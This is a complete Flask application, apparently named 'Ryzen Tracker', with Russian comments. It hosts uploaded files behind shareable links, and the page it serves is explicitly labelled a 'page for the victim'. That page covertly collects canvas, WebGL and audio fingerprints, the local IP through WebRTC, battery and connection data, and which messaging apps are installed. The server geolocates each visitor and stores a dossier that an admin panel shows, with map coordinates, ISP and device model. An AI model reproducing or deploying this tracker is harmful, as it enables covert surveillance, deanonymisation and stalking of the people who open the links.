from flask import Flask, request, send_from_directory, jsonify, render_template_string, redirect
import sqlite3, uuid, os, time, requests, json, mimetypes, re
from user_agents import parse

app = Flask(__name__)
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
DB = 'db.sqlite'

# ========== СЕКРЕТНЫЙ КЛЮЧ ==========
ADMIN_SECRET = "18iwixjwi199woxk"

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (uid TEXT PRIMARY KEY, filename TEXT, original_name TEXT, mime_type TEXT,
                  custom_title TEXT, custom_text TEXT, bg_color TEXT, language TEXT,
                  slug TEXT UNIQUE, created INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (uid TEXT, ip TEXT, ua TEXT, city TEXT, fingerprint TEXT, time INTEGER)''')
    conn.commit()
    conn.close()
init_db()

# ========== СТИЛИ (без изменений) ==========
STYLES = """
<style>
    body { font-family: 'Segoe UI', Tahoma, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f7fa; }
    h1, h2, h3 { color: #2c3e50; }
    .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-bottom: 20px; }
    .btn { display: inline-block; padding: 14px 28px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; transition: 0.3s; text-decoration: none; color: white; }
    .btn-primary { background: #3498db; }
    .btn-primary:hover { background: #2980b9; }
    .btn-success { background: #2ecc71; }
    .btn-success:hover { background: #27ae60; }
    .btn-danger { background: #e74c3c; }
    .btn-danger:hover { background: #c0392b; }
    .btn-warning { background: #f39c12; color: #333; }
    .btn-warning:hover { background: #e67e22; }
    .btn-sm { padding: 8px 16px; font-size: 14px; }
    input[type="file"], input[type="text"], input[type="color"], select, textarea {
        display: block; width: 100%; padding: 12px; font-size: 16px; border: 2px solid #ddd; border-radius: 8px; margin: 8px 0;
        box-sizing: border-box;
    }
    textarea { min-height: 80px; resize: vertical; }
    ul { list-style: none; padding: 0; }
    li { background: #f8f9fa; margin: 8px 0; padding: 15px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
    .file-type { font-size: 14px; color: #7f8c8d; margin-left: 10px; }
    .link-box { background: #eef2f7; padding: 15px; border-radius: 8px; word-break: break-all; margin: 10px 0; }
    a { color: #3498db; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .video-container { max-width: 100%; margin: 20px 0; }
    .video-container video { width: 100%; max-height: 500px; background: #000; }
    .pdf-container { width: 100%; height: 600px; }
    .pdf-container iframe { width: 100%; height: 100%; border: none; }
    .log-entry { border-left: 4px solid #3498db; padding-left: 15px; margin: 15px 0; background: #f8f9fa; padding: 15px; border-radius: 6px; }
    .log-entry .time { font-weight: bold; color: #2c3e50; }
    .settings-row { display: flex; flex-wrap: wrap; gap: 15px; }
    .settings-row > div { flex: 1; min-width: 200px; }
    .delete-btn { background: #e74c3c; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; }
    .delete-btn:hover { background: #c0392b; }
    .action-group { display: flex; gap: 10px; flex-wrap: wrap; margin: 10px 0; }
    .geo-info { background: #eef7ef; padding: 10px; border-radius: 6px; margin: 5px 0; }
    @media (max-width: 600px) {
        .btn { width: 100%; text-align: center; }
        li { flex-direction: column; align-items: flex-start; }
        .settings-row { flex-direction: column; }
    }
</style>
"""

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_geo_info(ip):
    """Город из ip-api.com, координаты и оператор из ipapi.co (если доступен)"""
    result = {
        'city': '',
        'country': '',
        'region': '',
        'loc': '',
        'org': '',
        'timezone': '',
        'source': 'ip-api.com'
    }
    # Базовые данные через ip-api.com (город, страна)
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=city,country,regionName,timezone', timeout=3)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                result['city'] = data.get('city', '')
                result['country'] = data.get('country', '')
                result['region'] = data.get('regionName', '')
                result['timezone'] = data.get('timezone', '')
    except:
        pass

    # Дополнительные данные (координаты, оператор) через ipapi.co
    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3)
        if resp.status_code == 200:
            data = resp.json()
            if 'error' not in data:
                lat = data.get('latitude')
                lon = data.get('longitude')
                if lat and lon:
                    result['loc'] = f"{lat},{lon}"
                if data.get('org'):
                    result['org'] = data['org']
                if not result['city'] and data.get('city'):
                    result['city'] = data['city']
                if not result['country'] and data.get('country_name'):
                    result['country'] = data['country_name']
                result['source'] += ' + ipapi.co'
    except:
        pass
    return result

# ========== БАЗА DPI ==========
DEVICE_DB = {
    (1170, 2532, 3.0): ('Apple', 'iPhone 14 Pro / 15 Pro'),
    (1179, 2556, 3.0): ('Apple', 'iPhone 15 Pro Max'),
    (1125, 2436, 3.0): ('Apple', 'iPhone X / XS / 11 Pro'),
    (1242, 2688, 3.0): ('Apple', 'iPhone XS Max / 11 Pro Max'),
    (828, 1792, 2.0): ('Apple', 'iPhone XR / 11'),
    (750, 1334, 2.0): ('Apple', 'iPhone 6/7/8 / SE2/SE3'),
    (1080, 1920, 2.0): ('Apple', 'iPhone 6 Plus / 7 Plus / 8 Plus'),
    (1080, 2340, 3.0): ('Samsung', 'Galaxy S21/S22/S23 (базовый)'),
    (1440, 3040, 3.0): ('Samsung', 'Galaxy S21+/S22+/S23+'),
    (1440, 3088, 3.0): ('Samsung', 'Galaxy S21 Ultra / S22 Ultra / S23 Ultra'),
    (1080, 2400, 3.0): ('Samsung', 'Galaxy A52/A53/A54'),
    (720, 1600, 2.0): ('Samsung', 'Galaxy A12/A13'),
    (1080, 2400, 2.75): ('Google', 'Pixel 7 / 8'),
    (1440, 3120, 3.0): ('Google', 'Pixel 7 Pro / 8 Pro'),
    (1080, 2340, 2.5): ('Google', 'Pixel 6'),
    (1440, 3120, 2.5): ('Google', 'Pixel 6 Pro'),
    (1080, 2400, 3.0): ('Xiaomi', 'Redmi Note 10/11/12'),
    (1080, 2340, 3.0): ('Xiaomi', 'Xiaomi 11/12'),
    (1440, 3200, 3.0): ('Xiaomi', 'Xiaomi 12 Pro / 13 Pro'),
    (720, 1600, 2.0): ('Xiaomi', 'Redmi 9/10'),
    (1080, 2400, 3.0): ('OnePlus', 'OnePlus 9/10/11'),
    (1440, 3216, 3.0): ('OnePlus', 'OnePlus 10 Pro/11 Pro'),
    (1080, 2400, 3.0): ('Huawei', 'P30/P40'),
    (1440, 3120, 3.0): ('Huawei', 'Mate 40 Pro'),
}

def guess_device_by_screen(screen_str, dpr):
    try:
        parts = screen_str.split('x')
        if len(parts) >= 2:
            w = int(parts[0])
            h = int(parts[1])
            if w < h:
                w, h = h, w
            for (bw, bh, bdpr), (brand, model) in DEVICE_DB.items():
                if abs(w - bw) <= 5 and abs(h - bh) <= 5 and abs(dpr - bdpr) <= 0.1:
                    return brand, model
    except:
        pass
    return None, None

# ========== ДЕКОРАТОР ДЛЯ ПРОВЕРКИ СЕКРЕТА ==========
def require_secret(f):
    def wrapper(*args, **kwargs):
        secret = request.view_args.get('secret')
        if secret != ADMIN_SECRET:
            return "Доступ запрещён", 403
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

# ========== КОРЕНЬ – 403 ==========
@app.route('/')
def root():
    return "Доступ запрещён", 403

# ========== АДМИН-ПАНЕЛЬ ==========
@app.route('/admin/<secret>')
@require_secret
def admin(secret):
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Ryzen Tracker</title>{{ STYLES|safe }}</head>
    <body>
        <div class="card">
            <h1>📁 Создать новую ссылку</h1>
            <form action="/admin/{{ secret }}/upload" method="post" enctype="multipart/form-data">
                <div class="settings-row">
                    <div>
                        <label><b>Файл</b></label>
                        <input type="file" name="file" required>
                    </div>
                </div>
                <hr>
                <h3>Настройки страницы (для того, кто перейдёт по ссылке)</h3>
                <div class="settings-row">
                    <div>
                        <label>Заголовок страницы</label>
                        <input type="text" name="custom_title" value="Просмотр">
                    </div>
                    <div>
                        <label>Текст над файлом</label>
                        <textarea name="custom_text" rows="3">Данный файл открыт для просмотра.</textarea>
                    </div>
                </div>
                <div class="settings-row">
                    <div>
                        <label>Цвет фона страницы (hex или название)</label>
                        <input type="text" name="bg_color" value="#ffffff" placeholder="#ffffff или white">
                    </div>
                    <div>
                        <label>Язык</label>
                        <select name="language">
                            <option value="ru">Русский</option>
                            <option value="en">English</option>
                        </select>
                    </div>
                </div>
                <div class="settings-row">
                    <div>
                        <label>Название ссылки (алиас)</label>
                        <input type="text" name="slug" placeholder="например, my-photo" value="">
                        <small style="color:#7f8c8d;">Оставьте пустым для автоматической генерации</small>
                    </div>
                </div>
                <button type="submit" class="btn btn-success">Загрузить и создать ссылку</button>
            </form>
        </div>
        <div class="card">
            <p><a href="/admin/{{ secret }}/dashboard" class="btn btn-primary">📋 Все файлы</a></p>
            <p><a href="/admin/{{ secret }}/logs" class="btn btn-primary">📊 Логи по ссылкам</a></p>
        </div>
    </body>
    </html>
    ''', secret=secret, STYLES=STYLES)

@app.route('/admin/<secret>/upload', methods=['POST'])
@require_secret
def upload(secret):
    if 'file' not in request.files:
        return "Нет файла", 400
    file = request.files['file']
    if file.filename == '':
        return "Пустое имя", 400
    uid = str(uuid.uuid4())[:8]
    original_name = file.filename
    ext = original_name.rsplit('.', 1)[1].lower() if '.' in original_name else ''
    filename = f"{uid}.{ext}" if ext else uid
    file.save(os.path.join(UPLOAD_FOLDER, filename))
    mime_type = mimetypes.guess_type(filename)[0] or 'application/octet-stream'

    custom_title = request.form.get('custom_title', 'Просмотр')
    custom_text = request.form.get('custom_text', 'Данный файл открыт для просмотра.')
    bg_color = request.form.get('bg_color', '#ffffff')
    language = request.form.get('language', 'ru')
    slug = request.form.get('slug', '').strip()
    if not slug:
        slug = uid

    conn = sqlite3.connect(DB)
    existing = conn.execute("SELECT uid FROM links WHERE slug=?", (slug,)).fetchone()
    if existing and existing[0] != uid:
        conn.close()
        return "Этот алиас уже используется, выберите другой", 400

    conn.execute("INSERT INTO links (uid, filename, original_name, mime_type, custom_title, custom_text, bg_color, language, slug, created) VALUES (?,?,?,?,?,?,?,?,?,?)",
                 (uid, filename, original_name, mime_type, custom_title, custom_text, bg_color, language, slug, int(time.time())))
    conn.commit()
    conn.close()
    
    base_url = request.host_url.rstrip('/')
    link = f"{base_url}/{slug}"
    return render_template_string('''
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Готово</title>{{ STYLES|safe }}</head>
    <body>
        <div class="card">
            <h2>✅ Ссылка создана</h2>
            <p><strong>{{ original_name }}</strong> ({{ mime_type }})</p>
            <div class="link-box">
                <b>Ссылка:</b> <span id="linkText">{{ link }}</span>
                <button class="btn btn-primary" onclick="copyLink()" style="margin-top:10px;">📋 Копировать</button>
            </div>
            <p><a href="/admin/{{ secret }}" class="btn btn-success">Создать ещё</a></p>
            <p><a href="/admin/{{ secret }}/logs/{{ uid }}" class="btn btn-primary">📊 Посмотреть логи</a></p>
        </div>
        <script>
        function copyLink() {
            navigator.clipboard.writeText('{{ link }}').then(() => alert('Ссылка скопирована!'));
        }
        </script>
    </body>
    </html>
    ''', link=link, uid=uid, original_name=original_name, mime_type=mime_type, secret=secret, STYLES=STYLES)

# ========== СТРАНИЦА ДЛЯ ЖЕРТВЫ ==========
TRACK_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>{{ title }}</title>
<style>
    body { font-family: 'Segoe UI', Tahoma, sans-serif; max-width: 800px; margin: 20px auto; padding: 20px; background: {{ bg_color }}; }
    .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-bottom: 20px; }
    img, video { max-width: 100%; display: block; margin: 0 auto; }
    .pdf-container { width: 100%; height: 600px; }
    .pdf-container iframe { width: 100%; height: 100%; border: none; }
</style>
</head>
<body>
    <div class="card">
        <h2>{{ title }}</h2>
        <p style="font-size:16px; color:#555; text-align:center; margin-bottom:20px;">{{ custom_text }}</p>
        <div>
            {% if mime_type.startswith('image/') %}
                <img src="/static/uploads/{{ filename }}" style="max-width:100%; max-height:80vh;">
            {% elif mime_type.startswith('video/') %}
                <video controls style="width:100%; max-height:500px;">
                    <source src="/static/uploads/{{ filename }}" type="{{ mime_type }}">
                </video>
            {% elif mime_type == 'application/pdf' %}
                <div class="pdf-container">
                    <iframe src="/static/uploads/{{ filename }}"></iframe>
                </div>
            {% else %}
                <p>Файл не может быть отображён в браузере. <a href="/static/uploads/{{ filename }}" download>Скачать</a></p>
            {% endif %}
        </div>
    </div>
    <script>
    (function() {
        const data = {
            uid: "{{ uid }}",
            screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
            dpr: window.devicePixelRatio || 1,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            lang: navigator.language,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
            canvas: (function() {
                let canvas = document.createElement('canvas');
                canvas.width = 200; canvas.height = 50;
                let ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = '#069';
                ctx.fillText('Ryzen', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Tracker', 4, 17);
                return canvas.toDataURL().slice(0, 100);
            })(),
            webgl: (function() {
                try {
                    let canvas = document.createElement('canvas');
                    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return '';
                    let ext = gl.getExtension('WEBGL_debug_renderer_info');
                    let vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                    let renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                    return vendor + '|' + renderer;
                } catch(e) { return ''; }
            })(),
            audio: (function() {
                try {
                    let ctx = new (window.AudioContext || window.webkitAudioContext)();
                    let oscillator = ctx.createOscillator();
                    let analyser = ctx.createAnalyser();
                    oscillator.connect(analyser);
                    analyser.connect(ctx.destination);
                    oscillator.start(0);
                    let data = new Uint8Array(analyser.frequencyBinCount);
                    analyser.getByteFrequencyData(data);
                    oscillator.stop(0);
                    return Array.from(data.slice(0, 10)).join(',');
                } catch(e) { return ''; }
            })(),
            apps: {
                telegram: navigator.userAgent.includes('Telegram') || (function() { try { return !!window.open('tg://'); } catch(e) { return false; } })(),
                viber: (function() { try { return !!window.open('viber://'); } catch(e) { return false; } })(),
                whatsapp: (function() { try { return !!window.open('whatsapp://'); } catch(e) { return false; } })(),
            },
            time_open: Date.now(),
            battery: null,
            connection: {
                type: navigator.connection ? navigator.connection.effectiveType : null,
                downlink: navigator.connection ? navigator.connection.downlink : null,
                rtt: navigator.connection ? navigator.connection.rtt : null,
            },
            localIP: null,
            vpn_detected: false
        };

        function sendData() {
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        }

        const promises = [];
        if (navigator.getBattery) {
            promises.push(
                navigator.getBattery().then(battery => {
                    data.battery = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                }).catch(() => {})
            );
        }
        function getLocalIP() {
            return new Promise(resolve => {
                let pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = function(ice) {
                    if (ice.candidate) {
                        let ip = ice.candidate.candidate.split(' ')[4];
                        if (ip && ip.includes('.')) {
                            resolve(ip);
                            pc.close();
                        }
                    }
                };
                setTimeout(() => resolve(null), 3000);
            });
        }
        promises.push(
            getLocalIP().then(ip => {
                data.localIP = ip;
            }).catch(() => {})
        );

        Promise.all(promises).then(() => {
            sendData();
        }).catch(() => {
            sendData();
        });

        window.addEventListener('beforeunload', function() {
            let time_spent = Date.now() - data.time_open;
            navigator.sendBeacon('/collect', JSON.stringify({uid: data.uid, time_spent: time_spent}));
        });
    })();
    </script>
</body>
</html>
"""

@app.route('/l/<uid>')
def track(uid):
    conn = sqlite3.connect(DB)
    row = conn.execute("SELECT filename, original_name, mime_type, custom_title, custom_text, bg_color, language FROM links WHERE uid=?", (uid,)).fetchone()
    if not row:
        return "Not found", 404
    filename, original_name, mime_type, custom_title, custom_text, bg_color, language = row
    conn.close()
    title = custom_title if custom_title else 'Просмотр'
    text = custom_text if custom_text else 'Данный файл открыт для просмотра.'
    bg = bg_color if bg_color else '#ffffff'
    return render_template_string(TRACK_PAGE_TEMPLATE, 
                                  uid=uid, filename=filename, original_name=original_name, mime_type=mime_type,
                                  title=title, custom_text=text, bg_color=bg)

# ========== СБОР ДАННЫХ ==========
@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    if not data or 'uid' not in data:
        return jsonify({"error": "No uid"}), 400
    uid = data['uid']
    ip = get_real_ip()
    ua = request.headers.get('User-Agent', '')
    
    # Геолокация
    geo = get_geo_info(ip)
    city = geo.get('city', '')
    
    # Парсинг User-Agent
    parsed_ua = parse(ua)
    os_version = parsed_ua.os.version_string
    device_model_ua = parsed_ua.device.family
    device_brand_ua = parsed_ua.device.brand
    
    # Определение модели по DPI
    screen_str = data.get('screen', '')
    dpr = data.get('dpr', 1)
    brand_dpi, model_dpi = guess_device_by_screen(screen_str, dpr)
    
    if model_dpi:
        device_model = model_dpi
        device_brand = brand_dpi if brand_dpi else device_brand_ua
    else:
        device_model = device_model_ua
        device_brand = device_brand_ua
    
    if not device_model or device_model == 'Other':
        if 'iPhone' in ua:
            match = re.search(r'iPhone(\d+,\d+)', ua)
            if match:
                device_model = 'iPhone ' + match.group(1)
            else:
                device_model = 'iPhone'
        elif 'Android' in ua:
            match = re.search(r'; (SM-[A-Za-z0-9]+)', ua)
            if match:
                device_model = match.group(1)
            else:
                device_model = 'Android-устройство'
    
    if not device_brand:
        device_brand = 'Неизвестно'
    
    operator = geo.get('org', '')
    
    data['os_version'] = os_version
    data['device_model'] = device_model
    data['device_brand'] = device_brand
    data['operator'] = operator
    data['geo'] = geo
    fingerprint = json.dumps(data)
    conn = sqlite3.connect(DB)
    conn.execute("INSERT INTO logs (uid, ip, ua, city, fingerprint, time) VALUES (?,?,?,?,?,?)",
                 (uid, ip, ua, city, fingerprint, int(time.time())))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

# ========== СТРАНИЦА ЛОГОВ ==========
@app.route('/admin/<secret>/logs')
@require_secret
def admin_logs(secret):
    conn = sqlite3.connect(DB)
    links = conn.execute("SELECT uid, original_name, created FROM links ORDER BY created ASC").fetchall()
    conn.close()
    html = f"""
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Все логи</title>{STYLES}</head>
    <body>
        <div class="card">
            <h1>📊 Логи по ссылкам</h1>
            <ul>
    """
    if not links:
        html += "<li>Нет созданных ссылок</li>"
    else:
        for idx, (uid, orig, created) in enumerate(links, start=1):
            conn2 = sqlite3.connect(DB)
            count = conn2.execute("SELECT COUNT(*) FROM logs WHERE uid=?", (uid,)).fetchone()[0]
            conn2.close()
            html += f"<li><b>{idx}.</b> {orig} — {time.ctime(created)} <span class='file-type'>({count} переходов)</span> <a href='/admin/{secret}/logs/{idx}' class='btn btn-primary btn-sm'>Детали</a></li>"
    html += f"""
            </ul>
            <p><a href="/admin/{secret}" class="btn btn-success">На главную</a></p>
        </div>
    </body>
    </html>
    """
    return html

@app.route('/admin/<secret>/logs/<int:num>')
@require_secret
def admin_logs_detail(secret, num):
    conn = sqlite3.connect(DB)
    all_links = conn.execute("SELECT uid, original_name, mime_type, created, slug FROM links ORDER BY created ASC").fetchall()
    if num < 1 or num > len(all_links):
        conn.close()
        return "Неверный номер", 404
    uid, orig, mime, created, slug = all_links[num-1]
    logs = conn.execute("SELECT ip, ua, city, fingerprint, time FROM logs WHERE uid=? ORDER BY time DESC", (uid,)).fetchall()
    conn.close()
    base_url = request.host_url.rstrip('/')
    link = f"{base_url}/l/{uid}"
    slug_link = f"{base_url}/{slug}" if slug else None
    html = f"""
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Логи #{num}</title>{STYLES}</head>
    <body>
        <div class="card">
            <h1>📊 Логи для ссылки #{num}</h1>
            <p><b>Файл:</b> {orig} ({mime}) — {time.ctime(created)}</p>
            <div class="link-box">
                <b>Ссылка:</b> <a href="{link}" target="_blank">{link}</a>
                {f'<br><b>Алиас:</b> <a href="{slug_link}" target="_blank">{slug_link}</a>' if slug_link else ''}
            </div>
            <div class="action-group">
                <form action="/admin/{secret}/clear_logs/{uid}" method="post" style="display:inline;">
                    <button type="submit" class="btn btn-warning btn-sm" onclick="return confirm('Очистить только логи?')">🧹 Очистить логи</button>
                </form>
                <form action="/admin/{secret}/delete_link" method="post" style="display:inline;">
                    <input type="hidden" name="uid" value="{uid}">
                    <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Удалить ссылку и все логи?')">🗑️ Удалить ссылку</button>
                </form>
            </div>
            <hr>
            <h3>Все переходы</h3>
    """
    if not logs:
        html += "<p>Нет переходов</p>"
    else:
        for ip, ua, city, fp, t in logs:
            html += f"<div class='log-entry'><span class='time'>{time.ctime(t)}</span><br>IP: {ip}<br>"
            # Город из базы (если есть)
            city_display = city if city else 'Неизвестно'
            html += f"<b>Город:</b> {city_display}<br>"
            if fp:
                try:
                    fp_data = json.loads(fp)
                    geo = fp_data.get('geo', {})
                    # Координаты и оператор (из geo)
                    loc = geo.get('loc')
                    if loc:
                        maps_link = f"https://www.google.com/maps?q={loc}"
                        html += f"<b>Координаты:</b> {loc} <a href='{maps_link}' target='_blank'>(карта)</a><br>"
                    org = geo.get('org')
                    if org:
                        html += f"<b>Оператор/провайдер:</b> {org}<br>"
                    # Остальные поля
                    html += f"<b>Версия ОС:</b> {fp_data.get('os_version', 'неизвестно')}<br>"
                    html += f"<b>Модель устройства:</b> {fp_data.get('device_model', 'неизвестно')}<br>"
                    html += f"<b>Бренд:</b> {fp_data.get('device_brand', 'неизвестно')}<br>"
                    html += f"<b>Экран:</b> {fp_data.get('screen', '')}<br>"
                    html += f"<b>Плотность пикселей:</b> {fp_data.get('dpr', '')}<br>"
                    html += f"<b>Часовой пояс:</b> {fp_data.get('timezone', '')}<br>"
                    html += f"<b>Язык:</b> {fp_data.get('lang', '')}<br>"
                    html += f"<b>Платформа:</b> {fp_data.get('platform', '')}<br>"
                    html += f"<b>Плагины:</b> {fp_data.get('plugins', '')[:50]}...<br>"
                    html += f"<b>Canvas Fingerprint:</b> {fp_data.get('canvas', '')[:20]}...<br>"
                    html += f"<b>WebGL:</b> {fp_data.get('webgl', '')}<br>"
                    html += f"<b>Audio Fingerprint:</b> {fp_data.get('audio', '')[:20]}...<br>"
                    apps = fp_data.get('apps', {})
                    installed = [k for k,v in apps.items() if v]
                    html += f"<b>Установленные приложения:</b> {', '.join(installed) if installed else 'не определено'}<br>"
                    battery = fp_data.get('battery')
                    if battery and isinstance(battery, dict):
                        html += f"<b>Батарея:</b> {battery.get('level', '?')}% ({'зарядка' if battery.get('charging') else 'разрядка'})<br>"
                    conn_info = fp_data.get('connection', {})
                    if conn_info:
                        html += f"<b>Тип соединения:</b> {conn_info.get('type', 'неизвестно')}<br>"
                        if conn_info.get('downlink'):
                            html += f"<b>Скорость (приблизительно):</b> {conn_info['downlink']} Мбит/с<br>"
                        if conn_info.get('rtt'):
                            html += f"<b>Задержка (RTT):</b> {conn_info['rtt']} мс<br>"
                    local_ip = fp_data.get('localIP')
                    if local_ip:
                        html += f"<b>Локальный IP (WebRTC):</b> {local_ip}<br>"
                    if 'time_spent' in fp_data:
                        html += f"<b>Время на странице:</b> {fp_data['time_spent']//1000} сек<br>"
                except Exception as e:
                    html += f"<i>Ошибка разбора данных</i><br>"
            html += "</div>"
    html += f"""
            <p><a href="/admin/{secret}/logs" class="btn btn-primary">Назад к списку</a></p>
        </div>
    </body>
    </html>
    """
    return html

# ========== ОЧИСТКА ЛОГОВ ==========
@app.route('/admin/<secret>/clear_logs/<uid>', methods=['POST'])
@require_secret
def admin_clear_logs(secret, uid):
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    cur.execute("DELETE FROM logs WHERE uid=?", (uid,))
    conn.commit()
    deleted = cur.rowcount
    conn.close()
    return f"""
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Очищено</title>{STYLES}</head>
    <body>
        <div class="card">
            <h2>🧹 Удалено {deleted} записей для UID {uid}</h2>
            <p><a href="/admin/{secret}/logs/{uid}" class="btn btn-primary">Вернуться к логам</a></p>
            <p><a href="/admin/{secret}" class="btn btn-success">На главную</a></p>
        </div>
    </body>
    </html>
    """

# ========== ПОЛНОЕ УДАЛЕНИЕ ССЫЛКИ ==========
@app.route('/admin/<secret>/delete_link', methods=['POST'])
@require_secret
def admin_delete_link(secret):
    uid = request.form.get('uid')
    if not uid:
        return "No uid", 400
    conn = sqlite3.connect(DB)
    row = conn.execute("SELECT filename FROM links WHERE uid=?", (uid,)).fetchone()
    if row:
        filename = row[0]
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.exists(filepath):
            os.remove(filepath)
    conn.execute("DELETE FROM logs WHERE uid=?", (uid,))
    conn.execute("DELETE FROM links WHERE uid=?", (uid,))
    conn.commit()
    conn.close()
    return redirect(f'/admin/{secret}/logs')

# ========== ИЗМЕНЕНИЕ АЛИАСА ==========
@app.route('/admin/<secret>/update_slug', methods=['POST'])
@require_secret
def admin_update_slug(secret):
    uid = request.form.get('uid')
    new_slug = request.form.get('new_slug', '').strip()
    if not uid or not new_slug:
        return "Неверные данные", 400
    conn = sqlite3.connect(DB)
    existing = conn.execute("SELECT uid FROM links WHERE slug=? AND uid!=?", (new_slug, uid)).fetchone()
    if existing:
        conn.close()
        return "Этот алиас уже используется", 400
    conn.execute("UPDATE links SET slug=? WHERE uid=?", (new_slug, uid))
    conn.commit()
    conn.close()
    return redirect(f'/admin/{secret}/logs/{uid}')

# ========== ДАШБОРД ==========
@app.route('/admin/<secret>/dashboard')
@require_secret
def admin_dashboard(secret):
    conn = sqlite3.connect(DB)
    links = conn.execute("SELECT uid, original_name, mime_type, created, slug FROM links ORDER BY created DESC").fetchall()
    conn.close()
    html = f"""
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Все файлы</title>{STYLES}</head>
    <body>
        <div class="card">
            <h1>📋 Все загруженные файлы</h1>
            <ul>
    """
    if not links:
        html += "<li>Файлов пока нет</li>"
    else:
        for uid, orig, mime, created, slug in links:
            html += f"<li><b>{orig}</b> <span class='file-type'>{mime}</span><br>UID: {uid} — {time.ctime(created)}<br>"
            html += f"<a href='/l/{uid}'>🔗 Ссылка</a> | <a href='/admin/{secret}/logs/{uid}'>📊 Логи</a>"
            if slug:
                html += f" | Алиас: <a href='/{slug}'>/{slug}</a>"
            html += f"<form action='/admin/{secret}/delete_link' method='post' style='display:inline; margin-left:10px;'>"
            html += f"<input type='hidden' name='uid' value='{uid}'>"
            html += f"<button type='submit' class='delete-btn' onclick='return confirm(\"Удалить ссылку и все логи?\")'>Удалить</button>"
            html += "</form></li>"
    html += f"""
            </ul>
            <p><a href="/admin/{secret}" class="btn btn-success">На главную</a></p>
        </div>
    </body>
    </html>
    """
    return html

# ========== АЛИАСЫ (общедоступные) ==========
@app.route('/<slug>')
def by_slug(slug):
    conn = sqlite3.connect(DB)
    row = conn.execute("SELECT uid FROM links WHERE slug=?", (slug,)).fetchone()
    conn.close()
    if row:
        return redirect(f"/l/{row[0]}")
    else:
        return "Ссылка не найдена", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)